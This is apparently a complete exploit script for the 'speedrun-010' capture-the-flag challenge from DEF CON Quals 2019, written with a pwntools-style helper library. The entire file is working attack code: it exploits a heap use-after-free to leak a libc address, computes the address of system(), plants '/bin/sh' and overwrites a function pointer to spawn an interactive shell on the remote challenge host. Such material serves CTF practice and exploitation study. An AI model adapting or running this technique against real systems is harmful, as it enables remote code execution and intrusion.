#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './speedrun-010'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'speedrun-010.quals2019.oooverflow.io', 'port':31337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_puts        = libc.sep_function['puts']

#==========

def attack(conn, **kwargs):
    sr = SpeedRun10(conn)

    sr.alloc_hoge('a'*0x8)
    sr.alloc_fuga('b'*0x8)
    sr.free_fuga()
    sr.alloc_hoge('\xff')

    libc.address = u(sr.alloc_fuga('b'*0x8)) - (offset_libc_puts | 0xff)
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    sr.alloc_hoge('/bin/sh')
    sr.free_hoge()
    sr.alloc_fuga('X'*0x10+p64(addr_libc_system), False)
    
class SpeedRun10:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc_hoge(self, name):
        self.sendafter('1, 2, 3, 4, or 5', '1')
        self.sendafter('name\n', name)

    def alloc_fuga(self, msg, recv=True):
        self.sendafter('1, 2, 3, 4, or 5', '2')
        self.sendafter('message\n', msg)
        if recv:
            return self.recvuntil('\n', drop=True)

    def free_hoge(self):
        self.sendafter('1, 2, 3, 4, or 5', '3')

    def free_fuga(self):
        self.sendafter('1, 2, 3, 4, or 5', '4')

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
